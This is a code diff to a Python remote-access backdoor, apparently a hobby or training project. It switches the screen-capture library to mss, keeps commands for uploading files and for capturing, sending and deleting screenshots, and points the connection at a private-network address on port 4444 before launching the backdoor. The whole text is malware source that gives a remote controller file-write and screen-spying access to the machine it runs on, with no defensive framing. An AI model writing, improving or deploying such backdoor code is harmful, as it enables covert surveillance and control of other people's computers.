@@ -1,9 +1,9 @@
 import socket, json
 import subprocess
 import os
-# os.system("pip3 install pyautogui")
 import base64
-import pyautogui
+# os.system("pip3 install mss")
+import mss
 
 
 class Backdoor:
@@ -65,8 +65,7 @@ class Backdoor:
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    screenshot = pyautogui.screenshot()
-                    screenshot.save("screen.png")
+                    im = mss.mss().shot(output="screen.png")
                     command_result = self.read_file("screen.png")
                     os.system("rm screen.png")
                     # "[+] Done! You get see it as screen.png"
@@ -77,7 +76,7 @@ class Backdoor:
                 self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("localhost", 4444)
+my_backdoor = Backdoor("192.168.0.103", 4444)
 my_backdoor.run()
 
 
